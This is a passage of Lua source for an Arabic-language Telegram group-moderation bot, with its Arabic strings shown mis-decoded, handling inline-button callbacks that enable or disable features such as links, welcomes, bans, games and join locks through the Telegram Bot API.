π£ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩ          π£ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨΉΨ·ΩΩ
π£ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ±           π£ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΩ.
π£ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω.
Ωβ’ββββββββββββββββββββ’Ω
Ψ§Ψ?ΨͺΩΨ± Ψ§ΩΨ§ΩΩΨ± Ψ§ΩΨ°Ω ΨͺΨ±ΩΩΨ―Ω ΩΩΩ Ψ§ΩΨ£Ψ³ΩΩΩΩ.β¬οΈ
γ€
α΄Κα΄Ι΄α΄Κ β³ [ sα΄α΄Κα΄α΄ α΄Κ?α΄](https://t.me/AKJA0)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ­ΩΨ§ΩΩ', callback_data=data.sender_user_id_.."/help1"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ', callback_data=data.sender_user_id_.."/help2"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± ', callback_data=data.sender_user_id_.."/help5"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨΉΨ·ΩΩ', callback_data=data.sender_user_id_.."/homeaddrem"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end

if Text and Text:match('(.*)/lockdul') and Owner(data) then
if tonumber(Text:match('(.*)/lockdul')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ²ΩΩ '
database:set(bot_id..'dw:bot:api'..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lock_links') and Addictive(data) then
if tonumber(Text:match('(.*)/lock_links')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ· '
database:del(bot_id.."Tshake:Link_Group"..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ ??', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockwelcome') and Addictive(data) then
if tonumber(Text:match('(.*)/lockwelcome')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ '
database:del(bot_id.."Tshake:Chek:Welcome"..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockwelcome') and Owner(data) then
if tonumber(Text:match('(.*)/lockwelcome')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ '
database:set(bot_id.."Tshake:Reply:Sudo"..Chat_id,true)   
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockide') and Owner(data) then
if tonumber(Text:match('(.*)/lockide')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω '
database:set(bot_id..'Tshake:Lock:ID:Bot'..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockidephoto') and Owner(data) then
if tonumber(Text:match('(.*)/lockidephoto')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω '
database:set(bot_id..'Tshake:Lock:ID:Bot:Photo'..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockkiked') and Constructor(data) then
if tonumber(Text:match('(.*)/lockkiked')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± '
database:set(bot_id.."Add:Group:Cheking"..Chat_id,"true")
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/locksetm') and Constructor(data) then
if tonumber(Text:match('(.*)/locksetm')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ '
database:set(bot_id.."Add:Group:Cheking"..Chat_id,"true")
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockkikedme') and Owner(data) then
if tonumber(Text:match('(.*)/lockkikedme')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ '
database:set(bot_id.."Tshake:Kick:Me"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockgames') and Owner(data) then
if tonumber(Text:match('(.*)/lockgames')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ '
database:del(bot_id.."Tshak:Lock:Games"..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockrepgr') and Owner(data) then
if tonumber(Text:match('(.*)/lockrepgr')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― '
database:set(bot_id.."Tshake:Reply:Manager"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
end
if Text and Text:match('(.*)/unlockdul') and Owner(data) then
if tonumber(Text:match('(.*)/unlockdul')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ²ΩΩ '
database:del(bot_id..'dw:bot:api'..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlock_links') and Addictive(data) then
if tonumber(Text:match('(.*)/unlock_links')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ· '
database:set(bot_id.."Tshake:Link_Group"..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockwelcome') and Addictive(data) then
if tonumber(Text:match('(.*)/unlockwelcome')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ '
database:set(bot_id.."Tshake:Chek:Welcome"..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockrepall') and Owner(data) then
if tonumber(Text:match('(.*)/unlockrepall')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ '
database:del(bot_id.."Tshake:Reply:Sudo"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockide') and Owner(data) then
if tonumber(Text:match('(.*)/unlockide')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω '
database:del(bot_id..'Tshake:Lock:ID:Bot'..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockidephoto') and Owner(data) then
if tonumber(Text:match('(.*)/unlockidephoto')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω '
database:del(bot_id..'Tshake:Lock:ID:Bot:Photo'..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockkiked') and Constructor(data) then
if tonumber(Text:match('(.*)/unlockkiked')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ­ΨΈΨ± '
database:del(bot_id.."Ban:Cheking"..Chat_id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlocksetm') and Constructor(data) then
if tonumber(Text:match('(.*)/unlocksetm')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ±ΩΨΉ '
database:set(bot_id.."Add:Group:Cheking"..Chat_id,"true")
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockkikedme') and Owner(data) then
if tonumber(Text:match('(.*)/unlockkikedme')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ '
database:del(bot_id.."Tshake:Kick:Me"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockgames') and Owner(data) then
if tonumber(Text:match('(.*)/unlockgames')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ '
database:set(bot_id.."Tshak:Lock:Games"..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/unlockrepgr') and Owner(data) then
if tonumber(Text:match('(.*)/unlockrepgr')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ― '
database:del(bot_id.."Tshake:Reply:Manager"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/homeaddrem') and Owner(data) then
if tonumber(Text:match('(.*)/homeaddrem')) == tonumber(data.sender_user_id_) then
local Texti = 'ΨͺΨ³ΨͺΨ·ΩΨΉ ΨͺΨΉΨ·ΩΩ ΩΨͺΩΨΉΩΩ ΨΉΨ¨Ψ± Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ±'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ²ΩΩ', callback_data=data.sender_user_id_.."/lockdul"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ²ΩΩ', callback_data=data.sender_user_id_.."/unlockdul"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·', callback_data=data.sender_user_id_.."/lock_links"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·', callback_data=data.sender_user_id_.."/unlock_links"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨', callback_data=data.sender_user_id_.."/lockwelcome"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨', callback_data=data.sender_user_id_.."/unlockwelcome"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ', callback_data=data.sender_user_id_.."/lockrepall"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ', callback_data=data.sender_user_id_.."/unlockrepall"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω', callback_data=data.sender_user_id_.."/lockide"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω', callback_data=data.sender_user_id_.."/unlockide"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω', callback_data=data.sender_user_id_.."/lockidephoto"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω', callback_data=data.sender_user_id_.."/unlockidephoto"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ±', callback_data=data.sender_user_id_.."/lockkiked"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ­ΨΈΨ±', callback_data=data.sender_user_id_.."/unlockkiked"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ', callback_data=data.sender_user_id_.."/locksetm"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±ΩΨΉ', callback_data=data.sender_user_id_.."/unlocksetm"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ', callback_data=data.sender_user_id_.."/lockkikedme"},{text = 'ΨͺΩΨΉΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ', callback_data=data.sender_user_id_.."/unlockkikedme"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨', callback_data=data.sender_user_id_.."/lockgames"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨', callback_data=data.sender_user_id_.."/unlockgames"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ―', callback_data=data.sender_user_id_.."/lockrepgr"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ―', callback_data=data.sender_user_id_.."/unlockrepgr"},
},
{
{text = 'π Ψ±Ψ¬ΩΨΉ Ψ§ΩΩ Ψ§ΩΨ?ΩΩ π', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Texti)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/lockjoine') and Addictive(data) then
if tonumber(Text:match('(.*)/lockjoine')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ§ΨΆΨ§ΩΩ '
database:set(bot_id.."Tshake:Lock:AddMempar"..Chat_id,"kick")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockchat') and Owner(tahaj) then
if tonumber(Text:match('(.*)/lockchat')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω '
database:set(bot_id.."Tshake:Lock:text"..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lock_joine') and Addictive(data) then
if tonumber(Text:match('(.*)/lock_joine')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ―Ψ?ΩΩ '
database:set(bot_id.."Tshake:Lock:Join"..Chat_id,"kick")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockbots') and Addictive(data) then
if tonumber(Text:match('(.*)/lockbots')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ '
database:set(bot_id.."Tshake:Lock:Bot:kick"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/locktags') and Addictive(data) then
if tonumber(Text:match('(.*)/locktags')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ '
database:set(bot_id.."Tshake:Lock:tagservr"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/lockedit') and Owner(tahaj) then
if tonumber(Text:match('(.*)/lockedit')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨͺΨΉΨ―ΩΩ '
database:set(bot_id.."Tshake:Lock:edit"..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
elseif Text and Text:match('(.*)/locklink') and Addictive(data) then
if tonumber(Text:match('(.*)/locklink')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· '
database:set(bot_id.."Tshake:Lock:Link"..Chat_id,"del")  
